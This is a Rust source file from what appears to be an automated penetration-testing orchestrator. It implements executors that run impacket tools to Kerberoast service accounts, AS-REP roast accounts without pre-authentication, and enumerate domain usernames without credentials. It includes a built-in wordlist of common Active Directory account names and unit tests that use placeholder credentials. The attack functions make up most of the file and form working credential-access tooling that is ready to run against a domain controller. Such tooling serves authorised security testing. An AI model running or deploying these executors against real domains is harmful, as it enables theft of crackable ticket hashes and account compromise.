//! Kerberos credential access tool executors (kerberoast, AS-REP roast,
//! user enumeration).

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_str, required_str};
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Request TGS tickets for SPNs via `impacket-GetUserSPNs`.
pub async fn kerberoast(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/{username}:{password}");

    CommandBuilder::new("impacket-GetUserSPNs")
        .arg(&target)
        .flag("-dc-ip", dc_ip)
        .arg("-request")
        .timeout_secs(60)
        .execute()
        .await
}

/// Request AS-REP hashes for accounts without pre-auth via `impacket-GetNPUsers`.
///
/// Supports two modes:
/// - With credentials: uses LDAP to enumerate users, then checks for no-preauth
/// - Without credentials: uses `-usersfile` with a wordlist and `-no-pass`
pub async fn asrep_roast(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let username = optional_str(args, "username").unwrap_or("");
    let password = optional_str(args, "password").unwrap_or("");
    let users_file = optional_str(args, "users_file");
    // Accept an inline username array via `known_users`. The orchestrator's
    // auto_credential_access automation discovers users via LDAP-via-ticket
    // and ACL enum, then injects them here so we don't have to re-enumerate
    // (which fails on hardened/SID-filtered DCs anyway). Dropping this read
    // would force asrep_roast to fall back to the generic seclists wordlist
    // and miss lab-specific enumerated accounts.
    let known_users: Vec<String> = args
        .get("known_users")
        .and_then(|v| v.as_array())
        .map(|arr| {
            arr.iter()
                .filter_map(|x| x.as_str().map(str::to_string))
                .filter(|s| !s.is_empty())
                .collect()
        })
        .unwrap_or_default();

    let mut cmd = CommandBuilder::new("impacket-GetNPUsers");

    // Materialize known_users (if any) to a temp file so we can pass it via
    // -usersfile. The temp file persists until process exit — short-lived
    // for AS-REP roast invocations.
    let known_users_tmp: Option<String> = if !known_users.is_empty() {
        let path = format!(
            "/tmp/asrep_known_users_{}_{}.txt",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or(0)
        );
        std::fs::write(&path, known_users.join("\n"))?;
        Some(path)
    } else {
        None
    };

    if !username.is_empty() && !password.is_empty() {
        // Authenticated mode: LDAP user enumeration
        let target = format!("{domain}/{username}:{password}");
        cmd = cmd.arg(&target);
    } else if let Some(uf) = users_file {
        // No-auth mode with explicit user file
        let target = format!("{domain}/");
        cmd = cmd.arg(&target).flag("-usersfile", uf).arg("-no-pass");
    } else if let Some(ref path) = known_users_tmp {
        // No-auth mode with orchestrator-supplied known_users array
        let target = format!("{domain}/");
        cmd = cmd.arg(&target).flag("-usersfile", path).arg("-no-pass");
    } else {
        // No-auth mode: use seclists if available, otherwise built-in AD usernames
        let target = format!("{domain}/");
        let seclists = "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt";
        if std::path::Path::new(seclists).exists() {
            cmd = cmd
                .arg(&target)
                .flag("-usersfile", seclists)
                .arg("-no-pass");
        } else {
            // Write built-in AD usernames to a temp file
            let tmp = format!("/tmp/asrep_users_{}.txt", std::process::id());
            std::fs::write(&tmp, DEFAULT_AD_USERNAMES)?;
            cmd = cmd.arg(&target).flag("-usersfile", &tmp).arg("-no-pass");
        }
    }

    let result = cmd
        .flag("-dc-ip", dc_ip)
        .arg("-request")
        .timeout_secs(120)
        .execute()
        .await;

    if let Some(path) = known_users_tmp {
        let _ = std::fs::remove_file(&path);
    }

    result
}

/// Common AD usernames for unauthenticated Kerberos enumeration.
pub(crate) const DEFAULT_AD_USERNAMES: &str = "\
Administrator\nadmin\nguest\nkrbtgt\n\
DefaultAccount\n\
sql_svc\nsvc_sql\nsqlservice\nsvc_mssql\n\
svc_backup\nbackup\n\
svc_web\nwebservice\n\
svc_iis\niis_svc\n\
svc_exchange\nexchange\n\
svc_admin\n\
svc_test\n\
testuser\ntest\n\
user1\nuser2\nuser3\n\
sam.wilson\njohn.smith\njohn.smith\n\
alice.jones\nsarah.connor\nbrian.davis\nedward.davis\n\
carol.lane\njames.lane\ntim.lane\n\
diana.torres\njoe.morgan\n\
steve.baker\nrichard.baker\n\
jdoe\nrobert.davis\ntom.green\n\
michelle\nkarl.davidson\nvictor.torres\n\
jeff.baker\ntony.baker\n\
paul.jackson\nlaura.chen\nmark.reed\n\
terry.lane\nbetty.taylor\n\
frank.ward\ndavid.ward\n\
lisa.murray\nkevin.murray\n\
nina.cole\nrosa.west\n\
derek.hunt\nclaire.hunt\n\
swilson\njdavis\nrcon\n\
";

/// Enumerate valid usernames via Kerberos pre-auth without credentials.
pub async fn kerberos_user_enum_noauth(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let users_file = optional_str(args, "users_file");

    let target = format!("{domain}/");

    // Use provided wordlist, seclists if available, or built-in defaults
    let tmp_file;
    let seclists = "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt";
    let wordlist_path = if let Some(uf) = users_file {
        uf.to_string()
    } else if std::path::Path::new(seclists).exists() {
        seclists.to_string()
    } else {
        tmp_file = format!("/tmp/kerberos_users_{}.txt", std::process::id());
        std::fs::write(&tmp_file, DEFAULT_AD_USERNAMES)?;
        tmp_file
    };

    let result = CommandBuilder::new("impacket-GetNPUsers")
        .arg(&target)
        .flag("-usersfile", &wordlist_path)
        .flag("-dc-ip", dc_ip)
        .arg("-no-pass")
        .timeout_secs(180)
        .execute()
        .await;

    // Clean up temp file if we created one (only when we wrote it ourselves)
    let wrote_tmp = users_file.is_none() && !std::path::Path::new(seclists).exists();
    if wrote_tmp {
        let _ = std::fs::remove_file(&wordlist_path);
    }

    result
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_str, required_str};
    use serde_json::json;

    // --- kerberoast ---

    #[test]
    fn kerberoast_target_format() {
        let domain = "contoso.local";
        let username = "admin";
        let password = "P@ssw0rd!";
        let target = format!("{domain}/{username}:{password}");
        assert_eq!(target, "contoso.local/admin:P@ssw0rd!");
    }

    #[test]
    fn kerberoast_requires_domain() {
        let args = json!({
            "username": "admin",
            "password": "P@ss",
            "dc_ip": "192.168.58.1"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn kerberoast_requires_username() {
        let args = json!({
            "domain": "contoso.local",
            "password": "P@ss",
            "dc_ip": "192.168.58.1"
        });
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn kerberoast_requires_password() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "dc_ip": "192.168.58.1"
        });
        assert!(required_str(&args, "password").is_err());
    }

    #[test]
    fn kerberoast_requires_dc_ip() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ss"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    // --- asrep_roast ---

    #[test]
    fn asrep_roast_authenticated_format() {
        let domain = "contoso.local";
        let username = "admin";
        let password = "P@ssw0rd!";
        // When both username and password are non-empty, authenticated mode
        if !username.is_empty() && !password.is_empty() {
            let target = format!("{domain}/{username}:{password}");
            assert_eq!(target, "contoso.local/admin:P@ssw0rd!");
        } else {
            panic!("should be authenticated mode");
        }
    }

    #[test]
    fn asrep_roast_no_auth_format() {
        let domain = "contoso.local";
        let username = "";
        let password = "";
        if !username.is_empty() && !password.is_empty() {
            panic!("should be no-auth mode");
        } else {
            let target = format!("{domain}/");
            assert_eq!(target, "contoso.local/");
        }
    }

    #[test]
    fn asrep_roast_username_default_empty() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.1"
        });
        let username = optional_str(&args, "username").unwrap_or("");
        let password = optional_str(&args, "password").unwrap_or("");
        assert_eq!(username, "");
        assert_eq!(password, "");
    }

    #[test]
    fn asrep_roast_with_users_file() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.1",
            "users_file": "/tmp/users.txt"
        });
        let users_file = optional_str(&args, "users_file");
        assert_eq!(users_file, Some("/tmp/users.txt"));
    }

    // --- DEFAULT_AD_USERNAMES ---

    #[test]
    fn default_ad_usernames_is_non_empty() {
        assert!(!super::DEFAULT_AD_USERNAMES.is_empty());
    }

    #[test]
    fn default_ad_usernames_contains_administrator() {
        assert!(super::DEFAULT_AD_USERNAMES.contains("Administrator"));
    }

    #[test]
    fn default_ad_usernames_contains_krbtgt() {
        assert!(super::DEFAULT_AD_USERNAMES.contains("krbtgt"));
    }

    // --- kerberos_user_enum_noauth ---

    #[test]
    fn kerberos_user_enum_requires_domain() {
        let args = json!({"dc_ip": "192.168.58.1"});
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn kerberos_user_enum_requires_dc_ip() {
        let args = json!({"domain": "contoso.local"});
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn kerberos_user_enum_target_format() {
        let domain = "contoso.local";
        let target = format!("{domain}/");
        assert_eq!(target, "contoso.local/");
    }

    #[test]
    fn kerberos_user_enum_optional_users_file() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.1",
            "users_file": "/tmp/custom_users.txt"
        });
        assert_eq!(
            optional_str(&args, "users_file"),
            Some("/tmp/custom_users.txt")
        );
    }

    #[test]
    fn kerberos_user_enum_no_users_file() {
        let args = json!({
            "domain": "contoso.local",
            "dc_ip": "192.168.58.1"
        });
        assert!(optional_str(&args, "users_file").is_none());
    }

    // --- mock executor tests ---

    use crate::executor::mock;

    #[tokio::test]
    async fn kerberoast_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "username": "admin",
            "password": "P@ss", "dc_ip": "192.168.58.1"
        });
        assert!(super::kerberoast(&args).await.is_ok());
    }

    #[tokio::test]
    async fn asrep_roast_authenticated_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "dc_ip": "192.168.58.1",
            "username": "admin", "password": "P@ss"
        });
        assert!(super::asrep_roast(&args).await.is_ok());
    }

    #[tokio::test]
    async fn asrep_roast_with_users_file_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "dc_ip": "192.168.58.1",
            "users_file": "/tmp/users.txt"
        });
        assert!(super::asrep_roast(&args).await.is_ok());
    }

    #[tokio::test]
    async fn kerberos_user_enum_with_file_executes() {
        mock::push(mock::success());
        let args = json!({
            "domain": "contoso.local", "dc_ip": "192.168.58.1",
            "users_file": "/tmp/users.txt"
        });
        assert!(super::kerberos_user_enum_noauth(&args).await.is_ok());
    }
}
